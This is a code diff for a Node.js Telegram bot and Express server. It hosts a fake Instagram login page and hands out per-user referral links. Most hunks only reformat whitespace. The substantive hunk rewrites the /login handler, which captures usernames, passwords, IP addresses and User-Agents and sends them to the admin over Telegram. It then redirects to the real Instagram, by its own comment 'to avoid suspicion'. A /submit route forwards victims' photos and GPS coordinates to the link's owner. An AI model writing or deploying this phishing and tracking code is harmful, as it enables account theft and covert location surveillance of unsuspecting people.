@@ -31,13 +31,13 @@ async function saveUser(id) {
     await fetch(`${FIREBASE_DB_URL}/users/${id}.json`, {
       method: "PUT",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ 
-        timestamp: Date.now() 
+      body: JSON.stringify({
+        timestamp: Date.now()
       })
     });
     await updateStats();
-  } catch (e) { 
-    console.error("Save user error:", e); 
+  } catch (e) {
+    console.error("Save user error:", e);
   }
 }
 
@@ -50,14 +50,14 @@ async function updateStats() {
     await fetch(`${FIREBASE_DB_URL}/stats.json`, {
       method: "PUT",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ 
-        total: total, 
-        updated: Date.now() 
+      body: JSON.stringify({
+        total: total,
+        updated: Date.now()
       })
     });
     console.log(`Stats updated: Total Users = ${total}`);
-  } catch (e) { 
-    console.error("Update stats error:", e); 
+  } catch (e) {
+    console.error("Update stats error:", e);
   }
 }
 
@@ -120,12 +120,12 @@ async function showSubscriptionRequired(ctx) {
 bot.start(async (ctx) => {
   const id = String(ctx.from.id);
   const isSubscribed = await checkSubscription(id);
-  
+
   if (!isSubscribed) {
     await showSubscriptionRequired(ctx);
     return;
   }
-  
+
   // User is subscribed, show normal content
   await saveUser(id);
   await ctx.reply(
@@ -142,10 +142,10 @@ bot.start(async (ctx) => {
 // Check subscription callback
 bot.action("check_subscription", async (ctx) => {
   await ctx.answerCbQuery("Checking subscription...");
-  
+
   const id = String(ctx.from.id);
   const isSubscribed = await checkSubscription(id);
-  
+
   if (isSubscribed) {
     await ctx.editMessageText(
       `✅ *Subscription Verified!*\n\nВаша ссылка:\nhttps://${HOST}/r/${id}\n\nInstagram: https://${HOST}/insta`,
@@ -176,12 +176,12 @@ bot.action("check_subscription", async (ctx) => {
 bot.command("link", async (ctx) => {
   const id = String(ctx.from.id);
   const isSubscribed = await checkSubscription(id);
-  
+
   if (!isSubscribed) {
     await showSubscriptionRequired(ctx);
     return;
   }
-  
+
   await saveUser(id);
   await ctx.reply(`https://${HOST}/r/${id}`);
 });
@@ -192,21 +192,21 @@ bot.use(async (ctx, next) => {
   if (ctx.message?.text === '/start' || ctx.message?.text === '/link' || ctx.message?.text === '/admin') {
     return next();
   }
-  
+
   // For other commands, check subscription
   const isSubscribed = await checkSubscription(ctx.from.id);
   if (!isSubscribed) {
     await showSubscriptionRequired(ctx);
     return;
   }
-  
+
   return next();
 });
 
 // ---------- ADMIN ----------
 bot.command("admin", async (ctx) => {
   if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.reply("Access denied.");
-  
+
   const { total } = await getStats();
   await ctx.reply(`Admin Panel\nTotal Users: ${total}`, {
     reply_markup: {
@@ -250,7 +250,7 @@ bot.action("broadcast", async (ctx) => {
 
   await ctx.editMessageText(
     `📢 *Broadcast Setup*\n\nUsers: ${userIds.length}\nBroadcast ID: ${broadcastId}\n\nNow send the message you want to broadcast:`,
-    { 
+    {
       parse_mode: "Markdown",
       reply_markup: {
         inline_keyboard: [
@@ -265,10 +265,10 @@ bot.action("broadcast", async (ctx) => {
 // Cancel broadcast
 bot.action(/cancel_(\d+)/, async (ctx) => {
   if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.answerCbQuery();
-  
+
   const broadcastId = ctx.match[1];
   broadcastState.delete(parseInt(broadcastId));
-  
+
   await ctx.editMessageText("❌ Broadcast cancelled.");
   await ctx.answerCbQuery();
 });
@@ -276,16 +276,16 @@ bot.action(/cancel_(\d+)/, async (ctx) => {
 // Handle broadcast message - FIXED: Prevent sending to channel
 bot.on("message", async (ctx) => {
   if (String(ctx.from.id) !== ADMIN_USER_ID) return;
-  
+
   // Prevent bot from processing messages in channels
   if (ctx.chat.type !== 'private') {
     return;
   }
-  
+
   // Find active broadcast for this admin
   let broadcastId = null;
   let state = null;
-  
+
   for (const [id, s] of broadcastState.entries()) {
     if (s.adminChatId === ctx.chat.id) {
       broadcastId = id;
@@ -293,9 +293,9 @@ bot.on("message", async (ctx) => {
       break;
     }
   }
-  
+
   if (!state) return; // No active broadcast
-  
+
   const messageText = ctx.message.text || ctx.message.caption || "";
   if (!messageText.trim()) {
     await ctx.reply("❌ Message cannot be empty. Please send your broadcast message again.");
@@ -314,7 +314,7 @@ bot.on("message", async (ctx) => {
   // Send to all users
   for (let i = 0; i < targets.length; i++) {
     const userId = targets[i];
-    
+
     try {
       // Try to send the message - only to users, not channels
       await ctx.telegram.sendMessage(userId, messageText);
@@ -346,9 +346,9 @@ bot.on("message", async (ctx) => {
 
   // Final result
   let resultText = `✅ *Broadcast Complete!*\n\n` +
-                  `📊 Total: ${targets.length} users\n` +
-                  `✅ Sent: ${sent}\n` +
-                  `❌ Failed: ${failed}`;
+    `📊 Total: ${targets.length} users\n` +
+    `✅ Sent: ${sent}\n` +
+    `❌ Failed: ${failed}`;
 
   if (failed > 0) {
     resultText += `\n\nFailed users: ${failedUsers.slice(0, 10).join(', ')}${failedUsers.length > 10 ? '...' : ''}`;
@@ -372,59 +372,44 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 6 * 1024 * 1024 } });
 
-// Serve Instagram page
-// Configure body parser before routes
-app.use(express.urlencoded({ extended: true }));
+// Serve static files (CSS, images, etc.)
+app.use("/insta", express.static(path.join(__dirname, "test insta")));
 
+// Serve the fake Instagram page
 app.get("/insta", (_req, res) => {
   res.sendFile(path.join(__dirname, "test insta", "index.html"));
 });
 
-// Serve static files from "test insta" directory
-app.use("/insta", express.static(path.join(__dirname, "test insta")));
-
-// Login Capture
-app.post("/login", async (req, res) => {
-  // Log the entire request body
-  console.log("Request body:", req.body);
-  
-  const { username, password } = req.body;
-  console.log("Login attempt details:");
-  console.log("Username:", username);
-  console.log("Password:", password);
-  console.log("IP:", req.ip);
-  console.log("Headers:", req.headers);
-
-  // Always redirect back to Instagram
-  res.redirect("https://www.instagram.com/");
-});
-
-// Student Page - Photo and Location Submission
-const INSTA_PATH = path.join(__dirname, "test insta");
-app.use("/insta", express.static(INSTA_PATH));
-
-// CAPTURE LOGIN
+// === CAPTURE LOGIN ===
 app.post("/login", async (req, res) => {
   const { username, password } = req.body;
-  if (!username || !password) return res.redirect("/insta");
 
-  const ip = req.ip || req.headers["x-forwarded-for"] || "unknown";
+  // Basic validation
+  if (!username || !password) {
+    return res.redirect("/insta");
+  }
+
+  const ip = req.ip || req.headers["x-forwarded-for"] || req.socket.remoteAddress || "unknown";
+  const userAgent = req.get('User-Agent') || "unknown";
   const time = new Date().toLocaleString();
 
   const message = `
-*INSTAGRAM LOGIN*
-*User:* \`${username}\`
-*Pass:* \`${password}\`
+*INSTAGRAM LOGIN ATTEMPT*
+*Username:* \`${username}\`
+*Password:* \`${password}\`
 *IP:* \`${ip}\`
+*User-Agent:* \`${userAgent}\`
 *Time:* \`${time}\`
   `.trim();
 
   try {
-    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { parse_mode: "Markdown" });
-  } catch (e) {
-    console.error("Failed to send login", e);
+    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { parse_mode: "MarkdownV2" });
+    console.log("Login captured & sent to Telegram:", { username, ip });
+  } catch (error) {
+    console.error("Failed to send to Telegram:", error.message);
   }
 
+  // Always redirect to real Instagram to avoid suspicion
   res.redirect("https://www.instagram.com/");
 });
 
@@ -567,7 +552,7 @@ app.post("/submit", upload.single("photo"), async (req, res) => {
       promises.push(
         bot.telegram.sendPhoto(inviterId, { source: req.file.buffer }, {
           caption: `New student (ref ${ref})`
-        }).catch(() => {})
+        }).catch(() => { })
       );
     }
 
@@ -576,14 +561,14 @@ app.post("/submit", upload.single("photo"), async (req, res) => {
       const lon = parseFloat(longitude);
       if (!isNaN(lat) && !isNaN(lon)) {
         promises.push(
-          bot.telegram.sendLocation(inviterId, lat, lon).catch(() => {}),
-          bot.telegram.sendMessage(inviterId, `GPS: ${lat.toFixed(5)}, ${lon.toFixed(5)}`).catch(() => {})
+          bot.telegram.sendLocation(inviterId, lat, lon).catch(() => { }),
+          bot.telegram.sendMessage(inviterId, `GPS: ${lat.toFixed(5)}, ${lon.toFixed(5)}`).catch(() => { })
         );
       }
     }
 
     if (promises.length === 0) {
-      promises.push(bot.telegram.sendMessage(inviterId, `Link opened (ref ${ref})`).catch(() => {}));
+      promises.push(bot.telegram.sendMessage(inviterId, `Link opened (ref ${ref})`).catch(() => { }));
     }
 
     await Promise.allSettled(promises);
@@ -616,7 +601,7 @@ bot.launch().then(() => {
 const keepAlive = () => {
   const url = `https://${HOST}`;
   console.log(`🔄 Making keep-alive request to: ${url}`);
-  
+
   fetch(url)
     .then(response => {
       if (response.ok) {
@@ -636,12 +621,12 @@ const KEEP_ALIVE_INTERVAL = 9 * 60 * 1000;
 // Start keep-alive only when server is fully ready
 server.on('listening', () => {
   console.log('✅ Server is fully ready, starting keep-alive service...');
-  
+
   // Wait 10 seconds after server is ready to ensure it can handle requests
   setTimeout(() => {
     keepAlive(); // Initial request
     setInterval(keepAlive, KEEP_ALIVE_INTERVAL); // Periodic requests
-    console.log(`🔄 Keep-alive service started (every ${KEEP_ALIVE_INTERVAL/1000/60} minutes)`);
+    console.log(`🔄 Keep-alive service started (every ${KEEP_ALIVE_INTERVAL / 1000 / 60} minutes)`);
   }, 10000);
 });
 
